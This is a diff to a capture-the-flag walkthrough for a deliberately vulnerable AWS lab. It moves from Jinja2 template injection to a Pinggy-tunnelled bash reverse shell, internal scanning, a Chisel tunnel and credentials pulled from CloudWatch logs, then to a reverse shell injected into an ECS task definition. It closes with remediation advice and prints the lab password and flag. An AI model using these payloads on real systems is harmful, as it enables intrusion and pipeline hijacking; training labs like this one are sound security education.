@@ -6,17 +6,23 @@
 
 ```mermaid
 flowchart TB
-    A[BeaverDam Incident Report Generator] --> B[SSTI Discovery]
+    A[BeaverDam Incident Report Generator] --> B[SSTI Discovery\n7×7 = 49]
     B --> C[RCE via Jinja2]
-    C --> D[Internal Network Recon]
-    D --> E[Prowler: CloudWatch KMS FAIL]
-    E --> F[Steampipe: SQL Query Logs]
-    F --> G[Git Credentials Extracted]
-    G --> H[CodeCommit Clone + Inject Reverse Shell]
-    H --> I[git push → CodePipeline Trigger]
-    I --> J[ECS Blue/Green Deploy]
-    J --> K[Reverse Shell → echo $FLAG]
-    K --> L[FLAG]
+    C --> D[Webapp Reverse Shell\nSSH Pinggy TCP Tunnel]
+    D --> E[Internal Network Recon\nip addr + port scan]
+    E --> F[Service Identification]
+    F --> G[Chisel Reverse Tunnel\nR:9090 + R:9194]
+    G --> H[Prowler Dashboard\nBrowser → localhost:9090]
+    G --> I[Steampipe SQL Console\nBrowser → localhost:9194]
+    H --> J[CloudWatch KMS FAIL\n/corp/deploy-pipeline]
+    J --> I
+    I --> K[Git Credentials Extracted\nCloning https://dev-user:PASSWORD@codecommit]
+    K --> L[CodeCommit Clone\nbeaverdam-config]
+    L --> M[task-definition.json Injection\nbash reverse shell command]
+    M --> N[git push main\nCodePipeline auto-triggers]
+    N --> O[ECS Blue/Green Deployment\n~5-10 min]
+    O --> P[Reverse Shell → echo $FLAG]
+    P --> Q[FLAG]
 ```
 
 ---
@@ -26,251 +32,295 @@ flowchart TB
 Access the web application and identify its functionality.
 
 ```bash
-# Get the webapp URL from Terraform output
 cd terraform
 terraform output webapp_url
 ```
 
-Open the URL in your browser. You'll see the **BeaverDam Incident Report Generator**.
+Open `http://<WEBAPP_IP>` in your browser. You'll see the **BeaverDam Incident Report Generator** with fields: Service Name, Incident Time, Owner, Summary.
 
-Key observations:
-- A form with fields: **Service Name**, **Incident Time**, **Owner**, **Summary**
-- "Powered by Flask" hint in the footer
-- Submit button generates an incident report
+![BeaverDam Incident Report Generator main screen](./images/step1-webapp-main.png)
 
-### Method 1: Using Browser
-
-1. Open `http://<WEBAPP_IP>` in your browser
-2. Observe the form fields and page structure
-3. Note the "Powered by Flask" footer hint — this suggests a Python/Jinja2 template engine
-
-### Method 2: Using CLI
-
-```bash
-curl -s http://<WEBAPP_IP>/ | grep -i "flask\|jinja\|template"
-```
+Key observation: "Powered by Flask" hint in the footer → Python/Jinja2 template engine.
 
 ---
 
 ## Step 2: SSTI Discovery
 
-Test for Server-Side Template Injection (SSTI) in the Summary field.
+Test for Server-Side Template Injection in the **Summary** field.
 
-Jinja2 templates evaluate expressions inside `{{ }}`. If user input is passed directly to `render_template_string()`, arbitrary expressions can be injected.
+Enter the following in the Summary field and submit:
 
-### Method 1: Using Browser
-
-1. In the **Summary** field, enter:
-   ```
-   {{7*7}}
-   ```
-2. Fill in any Service Name and click **Generate Report**
-3. The report output shows **49** instead of the literal string `{{7*7}}`
-
-**SSTI confirmed.** The application renders user input as a Jinja2 template.
-
-### Method 2: Using CLI
-
-```bash
-curl -s -X POST http://<WEBAPP_IP>/ \
-  --data-urlencode "service=test" \
-  --data-urlencode "incident_time=2026-01-01" \
-  --data-urlencode "owner=test" \
-  --data-urlencode "summary={{7*7}}" | grep "49"
+```
+{{7*7}}
 ```
 
-Output:
-```
-49
-```
+![SSTI Discovery - 49 rendered](./images/step2-ssti-49.png)
+
+The report output shows **49** instead of the literal string `{{7*7}}`. **SSTI confirmed.**
 
 ---
 
-## Step 3: Remote Code Execution via SSTI
+## Step 3: RCE via SSTI
 
-Escalate SSTI to arbitrary OS command execution using Jinja2's Python object access.
+Escalate SSTI to OS command execution.
 
-Flask's `config` object has access to Python globals, which can be used to reach the `os` module.
+```
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+```
 
-### Method 1: Using Browser
+![RCE Confirmed - id output](./images/step3-rce-id.png)
 
-1. In the **Summary** field, enter:
-   ```
-   {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
-   ```
-2. Submit the form
-
-Output in the report:
+Output:
 ```
 uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)
 ```
 
 **RCE confirmed.**
 
-### Method 2: Using CLI
+---
 
+## Step 4: Webapp Reverse Shell
+
+Use the SSTI RCE to establish a reverse shell on the webapp server. This gives a persistent interactive shell for subsequent recon steps.
+
+### 4.1 Prepare Listener (Local)
+
+If you have a public IP:
 ```bash
-# Helper function for SSTI execution
-ssti() {
-  curl -s -X POST http://<WEBAPP_IP>/ \
-    --data-urlencode "service=t" \
-    --data-urlencode "incident_time=t" \
-    --data-urlencode "owner=t" \
-    --data-urlencode "summary={{config.__class__.__init__.__globals__['os'].popen('$1').read()}}"
-}
-
-ssti "id"
+nc -lvnp 4444
 ```
 
-Output:
-```
-uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)
-```
+If behind NAT/home network, use **Pinggy TCP tunnel**:
+```bash
+# Tab 1 — listener
+nc -lvnp 4444
 
----
-
-## Step 4: Internal Network Reconnaissance
-
-Discover internal hosts and services from inside the webapp server.
-
-### 4.1 Find Internal IP
-
-```
-{{config.__class__.__init__.__globals__['os'].popen('ip addr show eth0').read()}}
+# Tab 2 — Pinggy TCP tunnel
+ssh -p 443 -R0:localhost:4444 tcp@a.pinggy.io
 ```
 
-Output:
+Pinggy prints the public endpoint:
 ```
-2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...
-    inet 10.0.1.15/24 brd 10.0.1.255 scope global eth0
-```
-
-### 4.2 Port Scan Internal Subnets
-
-Scan the tools subnet for Prowler (9090) and Steampipe (9194):
-
-**Scan port 9090:**
-```
-{{config.__class__.__init__.__globals__['os'].popen('for i in $(seq 1 254); do (nc -zv -w1 10.0.6.$i 9090 2>&1 | grep -v refused) & done; wait').read()}}
+Forwarding: tcp://uxwkk-14-36-96-117.run.pinggy-free.link:34029 -> localhost:4444
 ```
 
-Output:
-```
-Connection to 10.0.6.239 9090 port [tcp/*] succeeded!
-```
+![Pinggy TCP tunnel ready](./images/step4-pinggy-listener.png)
 
-**Scan port 9194:**
-```
-{{config.__class__.__init__.__globals__['os'].popen('for i in $(seq 1 254); do (nc -zv -w1 10.0.6.$i 9194 2>&1 | grep -v refused) & done; wait').read()}}
-```
-
-Output:
-```
-Connection to 10.0.6.119 9194 port [tcp/*] succeeded!
-```
-
-**Found:**
-| Service | Internal IP | Port |
-|---------|------------|------|
-| Prowler | `10.0.6.239` | 9090 |
-| Steampipe | `10.0.6.119` | 9194 |
-
-> **Note:** Internal IPs are assigned dynamically. Your values will differ.
-
----
-
-## Step 5: Prowler Dashboard — CloudWatch KMS FAIL
-
-Access the internal Prowler security dashboard to discover CI/CD pipeline intelligence.
-
-### Method 1: Using Browser (SSTI Payload)
+### 4.2 Trigger Reverse Shell via SSTI
 
 In the Summary field:
 ```
-{{config.__class__.__init__.__globals__['os'].popen('curl -s http://10.0.6.239:9090/').read()}}
+{{config.__class__.__init__.__globals__['os'].popen("bash -c 'bash -i >& /dev/tcp/uxwkk-14-36-96-117.run.pinggy-free.link/34029 0>&1'").read()}}
 ```
 
-Look for the failed CloudWatch check:
+Replace the Pinggy hostname and port with your own values.
 
-```html
+![SSTI reverse shell payload](./images/step4-ssti-shell-payload.png)
+
+The listener catches the connection:
+
+![Shell connected](./images/step4-shell-connected.png)
+
+You now have an interactive shell on the webapp EC2 instance.
+
+---
+
+## Step 5: Internal Network Reconnaissance
+
+From the reverse shell, identify the internal IP and network layout.
+
+```bash
+ip addr show eth0
+```
+
+![Internal IP identified](./images/step5-internal-ip.png)
+
+Example output:
+```
+inet 10.0.1.97/24 brd 10.0.1.255 scope global eth0
+```
+
+The webapp is in the `10.0.1.0/24` subnet. Tools subnet is `10.0.6.0/24`.
+
+---
+
+## Step 6: Port Scan + Service Identification
+
+### 6.1 Port Scan
+
+Run a port scan from the reverse shell. Download scan.py via HTTP tunnel or use nc directly:
+
+```bash
+# Scan tools subnet for common ports
+for port in 80 8080 9090 9194; do
+  for i in $(seq 1 254); do
+    (nc -zv -w1 10.0.6.$i $port 2>&1 | grep -v refused | grep succeeded) &
+  done
+  wait
+done | tee /tmp/scan.out
+```
+
+![Port scan results](./images/step6-port-scan.png)
+
+### 6.2 Service Identification
+
+Identify each discovered host:
+
+```bash
+while read target _; do
+  echo "===== $target ====="
+  curl -s -m 5 "http://$target/" | head -5
+done < /tmp/scan.out
+```
+
+![Service identification results](./images/step6-service-identify.png)
+
+**Discovered services:**
+
+| IP:PORT | Service |
+|---------|---------|
+| `10.0.1.97:80` | BeaverDam Incident Report Generator (self) |
+| `10.0.2.188:80/8080` | ALB (OK response) |
+| `10.0.3.4:80/8080` | ALB (OK response) |
+| `10.0.6.119:9194` | BeaverDam Security Analysis (Steampipe) |
+| `10.0.6.239:9090` | Prowler Security Report |
+
+---
+
+## Step 7: Chisel Reverse Tunnel Setup
+
+Set up a chisel reverse tunnel through the webapp shell to access Prowler and Steampipe directly in the local browser.
+
+### 7.1 Download Chisel (Local Machine)
+
+```bash
+cd /tmp
+curl -sLO https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz
+gunzip chisel_1.10.1_linux_amd64.gz
+mv chisel_1.10.1_linux_amd64 chisel
+chmod +x chisel
+```
+
+### 7.2 Open Four Terminals
+
+**Tab 1 — Chisel server (local):**
+```bash
+./chisel server -p 8001 --reverse
+```
+
+**Tab 2 — Pinggy TCP tunnel to expose chisel port:**
+```bash
+ssh -p 443 -R0:localhost:8001 tcp@a.pinggy.io
+```
+Note the output: `tcp://xxxx.run.pinggy-free.link:<PORT>`
+
+**Tab 3 — HTTP server to serve chisel binary:**
+```bash
+cd /tmp && python3 -m http.server 8000
+```
+Expose this via a **separate Pinggy HTTP tunnel**:
+```bash
+ssh -p 443 -R0:localhost:8000 http@a.pinggy.io
+```
+Note the HTTPS URL Pinggy gives you.
+
+**Tab 4 — Inside the webapp reverse shell:**
+```bash
+# Download chisel binary from your HTTP tunnel
+curl -s https://<HTTP_PINGGY_URL>/chisel -o /tmp/chisel
+chmod +x /tmp/chisel
+
+# Connect to chisel server and forward Prowler + Steampipe ports
+/tmp/chisel client <TCP_PINGGY_HOST>:<TCP_PINGGY_PORT> \
+  R:9090:10.0.6.239:9090 \
+  R:9194:10.0.6.119:9194
+```
+
+### 7.3 Access Dashboards in Browser
+
+Get your WSL/local IP:
+```bash
+hostname -I
+```
+
+Open in browser:
+- **Prowler**: `http://<WSL_IP>:9090`
+- **Steampipe**: `http://<WSL_IP>:9194`
+
+---
+
+## Step 8: Prowler Dashboard — CloudWatch KMS FAIL
+
+### Method 1: Browser (via Chisel Tunnel) ← Recommended
+
+Navigate to `http://<WSL_IP>:9090` in your browser.
+
+![Prowler dashboard - KMS FAIL finding](./images/step8-prowler-kms-fail.png)
+
+Look for:
+```
 [MEDIUM] cloudwatch_log_group_kms_encryption_enabled — FAIL
 Resource: arn:aws:logs:us-east-1:123456789012:log-group:/corp/deploy-pipeline
 ```
 
-### Method 2: Using CLI
-
-```bash
-ssti "curl -s http://10.0.6.239:9090/" | grep -A2 "kms_encryption"
-```
-
 **Key findings:**
-- CloudWatch log group `/corp/deploy-pipeline` has **no KMS encryption**
-- This log group contains CI/CD build logs — potentially with sensitive data in plaintext
+- Log group `/corp/deploy-pipeline` has **no KMS encryption** → build logs stored in plaintext
+- This is the target for Steampipe credential extraction
 
----
+### Method 2: SSTI curl (Alternative)
 
-## Step 6: Steampipe SQL Console — Query CloudWatch Logs
-
-Steampipe runs a Flask SQL query interface on port 9194 that can query AWS APIs including CloudWatch logs via `aws_cloudwatch_log_event`.
-
-### 6.1 Verify Steampipe is Running
-
-```
-{{config.__class__.__init__.__globals__['os'].popen('curl -s http://10.0.6.119:9194/').read()}}
-```
-
-### 6.2 List Available Log Groups
-
-```
-{{config.__class__.__init__.__globals__['os'].popen('curl -s -X POST http://10.0.6.119:9194/query -H "Content-Type: application/json" -d "{\"sql\":\"select log_group_name from aws_cloudwatch_log_group limit 20\"}"').read()}}
-```
-
-Output:
-```json
-[{"log_group_name": "/corp/deploy-pipeline"}]
-```
-
-### 6.3 Query Recent Log Events
-
-```
-{{config.__class__.__init__.__globals__['os'].popen('curl -s -X POST http://10.0.6.119:9194/query -H "Content-Type: application/json" -d "{\"sql\":\"select log_stream_name, message, timestamp from aws_cloudwatch_log_event where log_group_name = \'/corp/deploy-pipeline\' order by timestamp desc limit 50\"}"').read()}}
-```
-
-Output (excerpt):
-```json
-[
-  {"message": "Cloning https://dev-user-at-813333281808:<PASSWORD>@git-codecommit.us-east-1.amazonaws.com/v1/repos/beaverdam-config", "timestamp": "2026-05-01T00:58:12Z"},
-  ...
-]
+From the SSTI form or reverse shell:
+```bash
+curl -s http://10.0.6.239:9090/ | grep -A3 "kms_encryption"
 ```
 
 ---
 
-## Step 7: Git Credential Extraction
+## Step 9: Steampipe SQL Console — Query CloudWatch Logs
 
-The `Cloning https://...` log entry contains CodeCommit HTTPS Git credentials hardcoded in the CodeBuild buildspec.
+### Method 1: Browser (via Chisel Tunnel) ← Recommended
 
-### 7.1 Search for Clone Log
+Navigate to `http://<WSL_IP>:9194` in your browser.
 
-Use a targeted SQL query:
-
-```
-{{config.__class__.__init__.__globals__['os'].popen('curl -s -X POST http://10.0.6.119:9194/query -H "Content-Type: application/json" -d "{\"sql\":\"select message from aws_cloudwatch_log_event where log_group_name = \'/corp/deploy-pipeline\' and message like \'%Cloning https://%\' limit 5\"}"').read()}}
-```
-
-Output:
-```json
-[{"message": "Cloning https://dev-user-at-813333281808:<PASSWORD>@git-codecommit.us-east-1.amazonaws.com/v1/repos/beaverdam-config"}]
+**Query 1 — List log groups:**
+```sql
+select log_group_name from aws_cloudwatch_log_group limit 20;
 ```
 
-### 7.2 Parse the Credentials
+**Query 2 — Find git credentials in build logs:**
+```sql
+select message from aws_cloudwatch_log_event
+where log_group_name = '/corp/deploy-pipeline'
+order by timestamp asc
+limit 50;
+```
 
-Extract from the URL:
+> **Note:** Use `ORDER BY timestamp ASC` — the `Cloning https://` line appears early in the build log (pre_build phase). Using DESC may miss it if you don't query enough rows.
+
+![Steampipe query - credentials found](./images/step9-steampipe-credentials.png)
+
+The log contains:
+```
+Cloning https://dev-user-at-813333281808:aPGIl74wWyZC0HKpHnXUzM0LUYTlxzZRZv0WThIrTEjCC3iURHrbqUQNYhU=@git-codecommit.us-east-1.amazonaws.com/v1/repos/beaverdam-config
+```
+
+### Method 2: SSTI curl (Alternative)
+
+```
+{{config.__class__.__init__.__globals__['os'].popen('curl -s -X POST http://10.0.6.119:9194/query -H "Content-Type: application/json" -d "{\"sql\":\"select message from aws_cloudwatch_log_event where log_group_name = \'/corp/deploy-pipeline\' order by timestamp asc limit 50\"}"').read()}}
+```
+
+---
+
+## Step 10: Git Credential Extraction
+
+Parse the credentials from the CloudWatch log:
+
 ```
 https://<USERNAME>:<PASSWORD>@git-codecommit.us-east-1.amazonaws.com/v1/repos/beaverdam-config
 ```
 
-Example:
+Extracted:
 ```
 Username: dev-user-at-813333281808
 Password: aPGIl74wWyZC0HKpHnXUzM0LUYTlxzZRZv0WThIrTEjCC3iURHrbqUQNYhU=
@@ -280,107 +330,65 @@ Password: aPGIl74wWyZC0HKpHnXUzM0LUYTlxzZRZv0WThIrTEjCC3iURHrbqUQNYhU=
 
 ---
 
-## Step 8: Set Up Reverse Shell Listener
+## Step 11: Set Up ECS Reverse Shell Listener
 
-Before modifying the CodeCommit repository, set up a listener to catch the reverse shell.
+Before modifying the CodeCommit repository, set up a listener to catch the reverse shell from the ECS container.
 
-### Option A: Direct Listener (if you have a public IP)
-
+### Option A: Direct listener (public IP)
 ```bash
 nc -lvnp 4444
 ```
 
-### Option B: Pinggy TCP Tunnel (for NAT/home network)
-
+### Option B: Pinggy TCP tunnel
 ```bash
+# Tab 1
+nc -lvnp 4444
+
+# Tab 2
 ssh -p 443 -R0:localhost:4444 tcp@a.pinggy.io
+# → tcp://umvpv-14-36-96-117.run.pinggy-free.link:38369
 ```
 
-Pinggy will print a public address:
-```
-Forwarding: tcp://umvpv-14-36-96-117.run.pinggy-free.link:38369 -> localhost:4444
-```
+Note the **hostname** and **port** — embed these in the task definition.
 
-In a second terminal, start the listener:
-```bash
-nc -lvnp 4444
-```
-
-Note the **hostname** and **port** — you'll embed these in the container command.
+![ECS listener ready - Pinggy TCP tunnel](./images/step11-ecs-listener.png)
 
 ---
 
-## Step 9: CodeCommit Clone & Payload Injection
+## Step 12: CodeCommit Clone & Payload Injection
 
-### 9.1 Clone the Repository
+### 12.1 Clone the Repository
 
 ```bash
-git clone https://dev-user-at-813333281808:<PASSWORD>@git-codecommit.us-east-1.amazonaws.com/v1/repos/beaverdam-config
+git clone https://dev-user-at-813333281808:aPGIl74wWyZC0HKpHnXUzM0LUYTlxzZRZv0WThIrTEjCC3iURHrbqUQNYhU=@git-codecommit.us-east-1.amazonaws.com/v1/repos/beaverdam-config
 cd beaverdam-config
 ```
 
-### 9.2 Inspect task-definition.json
+![CodeCommit clone success](./images/step12-git-clone.png)
+
+### 12.2 Inspect task-definition.json
 
 ```bash
 cat task-definition.json
 ```
 
-Output:
-```json
-{
-  "family": "beaverdam-app",
-  "networkMode": "awsvpc",
-  "requiresCompatibilities": ["FARGATE"],
-  "cpu": "256",
-  "memory": "512",
-  "executionRoleArn": "arn:aws:iam::123456789012:role/beaverdam-ecs-task-execution-role",
-  "containerDefinitions": [
-    {
-      "name": "beaverdam-app",
-      "image": "<IMAGE1_NAME>",
-      "essential": true,
-      "portMappings": [{"containerPort": 3000, "protocol": "tcp"}],
-      "secrets": [{"name": "FLAG", "valueFrom": "arn:aws:secretsmanager:us-east-1:123456789012:secret:beaverdam/flag-XXXXXX"}]
-    }
-  ]
-}
-```
+![task-definition.json before modification](./images/step12-task-definition-before.png)
 
-Notice the `FLAG` secret is injected into the container as an environment variable via `secrets`.
+Notice: no `command` field in `containerDefinitions[0]`. The `FLAG` secret is injected via the `secrets` array.
 
-### 9.3 Inject Reverse Shell Command
+### 12.3 Inject Reverse Shell Command
 
 Add a `command` field to `containerDefinitions[0]`:
 
 ```json
-"command": ["bash", "-c", "bash -i >& /dev/tcp/<ATTACKER_HOST>/<PORT> 0>&1 & node server.js"]
+"command": ["bash", "-c", "bash -i >& /dev/tcp/umvpv-14-36-96-117.run.pinggy-free.link/38369 0>&1 & node server.js"]
 ```
 
-Example after modification:
-```json
-{
-  "family": "beaverdam-app",
-  "networkMode": "awsvpc",
-  "requiresCompatibilities": ["FARGATE"],
-  "cpu": "256",
-  "memory": "512",
-  "executionRoleArn": "arn:aws:iam::123456789012:role/beaverdam-ecs-task-execution-role",
-  "containerDefinitions": [
-    {
-      "name": "beaverdam-app",
-      "image": "<IMAGE1_NAME>",
-      "essential": true,
-      "command": ["bash", "-c", "bash -i >& /dev/tcp/umvpv-14-36-96-117.run.pinggy-free.link/38369 0>&1 & node server.js"],
-      "portMappings": [{"containerPort": 3000, "protocol": "tcp"}],
-      "secrets": [{"name": "FLAG", "valueFrom": "arn:aws:secretsmanager:us-east-1:123456789012:secret:beaverdam/flag-XXXXXX"}]
-    }
-  ]
-}
-```
+![task-definition.json after modification](./images/step12-task-definition-after.png)
 
-> **Critical:** Use `["bash", "-c", "..."]` (not `sh`) because `/dev/tcp` is a bash built-in. The `&` runs the reverse shell in the background so `node server.js` also starts, keeping the ECS task alive.
+> **Critical:** Use `["bash", "-c", "..."]` not `sh`. The `&` runs the reverse shell in the background so `node server.js` also starts, keeping the ECS task healthy.
 
-### 9.4 Commit and Push
+### 12.4 Commit and Push
 
 ```bash
 git config user.email "ops@beaverdam.internal"
@@ -390,19 +398,15 @@ git commit -m "update task definition"
 git push origin main
 ```
 
-Output:
-```
-To https://git-codecommit.us-east-1.amazonaws.com/v1/repos/beaverdam-config
-   a1b2c3d..e4f5a6b  main -> main
-```
+![git push success](./images/step12-git-push.png)
 
-**Push succeeded.** CodePipeline's `PollForSourceChanges` will detect the commit and trigger the pipeline within 1 minute.
+**Push succeeded.** CodePipeline's `PollForSourceChanges` triggers within 1 minute.
 
 ---
 
-## Step 10: CodePipeline Execution & Blue/Green Deployment
+## Step 13: CodePipeline Execution & Blue/Green Deployment
 
-### 10.1 Monitor Pipeline Status (Optional)
+### Monitor Pipeline (Optional)
 
 ```bash
 aws codepipeline get-pipeline-state \
@@ -411,37 +415,32 @@ aws codepipeline get-pipeline-state \
 ```
 
 Pipeline stages:
-1. **Source** (~1 min): CodePipeline detects the CodeCommit push
-2. **Build** (~3-5 min): CodeBuild builds the Docker image and pushes to ECR
+1. **Source** (~1 min): CodePipeline detects CodeCommit push
+2. **Build** (~3-5 min): CodeBuild builds Docker image, pushes to ECR
 3. **Deploy** (~3-5 min): CodeDeploy performs ECS Blue/Green deployment
 
-Total wait time: approximately **5–10 minutes**.
+Total wait: **~5–10 minutes**.
 
-### 10.2 Watch for Reverse Shell
+Keep your `nc` listener running. When the new ECS task starts:
 
-Keep your `nc` listener running:
+![Reverse shell connected from ECS container](./images/step13-ecs-shell-connected.png)
 
-```bash
-nc -lvnp 4444
 ```
-
-When the new ECS task starts:
-```
-Connection from 54.x.x.x:12345
+Connection from 54.x.x.x:xxxxx
 bash: cannot set terminal process group (-1): Inappropriate ioctl for device
-bash: no job control in this shell
-root@ip-10-0-2-47:/#
+root@ip-10-0-x-x:/#
 ```
 
 ---
 
-## Step 11: Capture the FLAG
+## Step 14: Capture the FLAG
 
 ```bash
 echo $FLAG
 ```
 
-Output:
+![FLAG captured](./images/step14-flag.png)
+
 ```
 FLAG{d3pl0y_p1p3l1n3_h1j4ck_2026}
 ```
@@ -452,29 +451,33 @@ FLAG{d3pl0y_p1p3l1n3_h1j4ck_2026}
 
 ```
 1. BeaverDam Incident Report Generator (http://<WEBAPP_IP>)
-   ↓ SSTI via Summary field: {{7*7}} → 49
-2. Jinja2 SSTI → RCE
+   ↓ SSTI: {{7*7}} → 49
+2. RCE via Jinja2
    ↓ config.__class__.__init__.__globals__['os'].popen('id')
-3. Internal Network Scan
-   ↓ nc -zv 10.0.6.X 9090/9194 (via SSTI)
-4. Prowler Dashboard (10.0.6.X:9090)
+3. Webapp Reverse Shell (Pinggy TCP tunnel)
+   ↓ bash -i >& /dev/tcp/<PINGGY_HOST>/<PORT> 0>&1
+4. Internal Network Recon
+   ↓ ip addr → 10.0.1.97/24
+5. Port Scan + Service ID
+   ↓ Prowler 10.0.6.239:9090 / Steampipe 10.0.6.119:9194
+6. Chisel Reverse Tunnel
+   ↓ R:9090:10.0.6.239:9090 R:9194:10.0.6.119:9194
+7. Prowler Browser (http://<WSL_IP>:9090)
    ↓ cloudwatch_log_group_kms_encryption_enabled FAIL
    ↓ Log group: /corp/deploy-pipeline
-5. Steampipe SQL Console (10.0.6.Y:9194)
-   ↓ POST /query → aws_cloudwatch_log_event
-6. CloudWatch Log Event
-   ↓ Cloning https://dev-user-at-813333281808:<PASSWORD>@git-codecommit...
-7. CodeCommit Clone (beaverdam-config)
-   ↓ task-definition.json modification: add bash reverse shell command
-8. git push origin main
-   ↓ CodePipeline PollForSourceChanges triggers automatically
-9. CodeBuild → ECR push → CodeDeploy ECS Blue/Green
-   ↓ ~5-10 min
-10. ECS Task starts with injected command
-    ↓ bash -i >& /dev/tcp/<ATTACKER>/PORT 0>&1
-11. nc -lvnp 4444 catches shell → echo $FLAG
+8. Steampipe Browser (http://<WSL_IP>:9194)
+   ↓ SELECT … ORDER BY timestamp ASC LIMIT 50
+9. CloudWatch Log → Git Credentials
+   ↓ dev-user-at-813333281808:<PASSWORD>
+10. git clone beaverdam-config
+    ↓ task-definition.json → add bash reverse shell command
+11. git push origin main
+    ↓ CodePipeline PollForSourceChanges triggers
+12. CodeBuild → ECR → CodeDeploy ECS Blue/Green (~5-10 min)
     ↓
-12. FLAG{d3pl0y_p1p3l1n3_h1j4ck_2026}
+13. ECS Task starts → reverse shell caught → echo $FLAG
+    ↓
+14. FLAG{d3pl0y_p1p3l1n3_h1j4ck_2026}
 ```
 
 ---
@@ -482,31 +485,33 @@ FLAG{d3pl0y_p1p3l1n3_h1j4ck_2026}
 ## Key Techniques
 
 ### SSTI RCE Payload
-
 ```python
-# Basic RCE via Flask config globals
 {{config.__class__.__init__.__globals__['os'].popen('COMMAND').read()}}
 ```
 
-### Internal Port Scan via SSTI
-
-```bash
-for i in $(seq 1 254); do (nc -zv -w1 10.0.6.$i 9090 2>&1 | grep -v refused) & done; wait
+### SSTI Reverse Shell
+```python
+{{config.__class__.__init__.__globals__['os'].popen("bash -c 'bash -i >& /dev/tcp/<HOST>/<PORT> 0>&1'").read()}}
 ```
 
-### Steampipe CloudWatch Log Query
+### Chisel Reverse Port Forward
+```bash
+# Server (local)
+./chisel server -p 8001 --reverse
 
+# Client (from reverse shell on target)
+/tmp/chisel client <CHISEL_SERVER_HOST>:<PORT> R:9090:10.0.6.239:9090 R:9194:10.0.6.119:9194
+```
+
+### Steampipe CloudWatch Query (use ASC)
 ```sql
-select message, timestamp
-from aws_cloudwatch_log_event
+select message from aws_cloudwatch_log_event
 where log_group_name = '/corp/deploy-pipeline'
-  and message like '%Cloning https://%'
-order by timestamp desc
-limit 10;
+order by timestamp asc
+limit 50;
 ```
 
 ### ECS Task Definition Reverse Shell Injection
-
 ```json
 "command": ["bash", "-c", "bash -i >& /dev/tcp/<HOST>/<PORT> 0>&1 & node server.js"]
 ```
@@ -516,7 +521,6 @@ limit 10;
 ## Lessons Learned
 
 ### 1. Never Pass User Input to Template Engines
-
 ```python
 # VULNERABLE
 return render_template_string(f"<p>{user_input}</p>")
@@ -526,23 +530,15 @@ return render_template('report.html', summary=escape(user_input))
 ```
 
 ### 2. Never Hardcode Credentials in Buildspecs
-
 ```yaml
 # VULNERABLE
-phases:
-  pre_build:
-    commands:
-      - git clone https://dev-user:SuperSecret@git-codecommit...
+- git clone https://dev-user:SuperSecret@git-codecommit...
 
-# SECURE — use IAM role with codecommit:GitPull, no credentials needed
-phases:
-  pre_build:
-    commands:
-      - git clone https://git-codecommit.us-east-1.amazonaws.com/v1/repos/beaverdam-config
+# SECURE — use IAM role with codecommit:GitPull
+- git clone https://git-codecommit.us-east-1.amazonaws.com/v1/repos/beaverdam-config
 ```
 
 ### 3. Encrypt CloudWatch Logs with KMS
-
 ```hcl
 resource "aws_cloudwatch_log_group" "pipeline" {
   name       = "/corp/deploy-pipeline"
@@ -550,12 +546,10 @@ resource "aws_cloudwatch_log_group" "pipeline" {
 }
 ```
 
-### 4. Restrict Internal Service Access via Security Groups
-
-Prowler and Steampipe should not be reachable from the webapp subnet. Use separate security groups per tier and deny cross-tier access that isn't required.
+### 4. Network Segmentation — Isolate Tools Subnet
+Prowler and Steampipe must not be reachable from the webapp security group. Use separate security group rules per tier.
 
 ### 5. Protect Main Branch in CodeCommit
-
 ```json
 {
   "Effect": "Deny",
@@ -574,7 +568,6 @@ Prowler and Steampipe should not be reachable from the webapp subnet. Use separa
 ## Remediation
 
 ### Secure Flask Application
-
 ```python
 from flask import render_template, request
 from markupsafe import escape
@@ -585,8 +578,7 @@ def index():
     return render_template('report.html', summary=summary)
 ```
 
-### Secure CodeBuild IAM Policy
-
+### Secure CodeBuild — IAM Role Auth
 ```json
 {
   "Effect": "Allow",
@@ -595,10 +587,11 @@ def index():
 }
 ```
 
-### Additional Security Measures
+Grant the CodeBuild service role `codecommit:GitPull` — no credentials needed in the buildspec.
 
+### Additional Security Measures
 1. **AWS WAF**: Block SSTI patterns (`{{`, `__class__`, `__globals__`) at the ALB
-2. **VPC Security Groups**: Isolate webapp subnet from tools subnet
-3. **CloudTrail + GuardDuty**: Alert on anomalous CodeCommit push patterns
-4. **Branch Protection**: Require pull request review for `main` branch pushes
+2. **VPC Security Groups**: Isolate webapp subnet from tools subnet (deny 9090/9194 from webapp SG)
+3. **CloudTrail + GuardDuty**: Alert on anomalous CodeCommit push patterns from non-CI sources
+4. **Branch Protection**: Require PR review for `main` branch pushes
 5. **CloudWatch KMS**: Encrypt all log groups containing build output
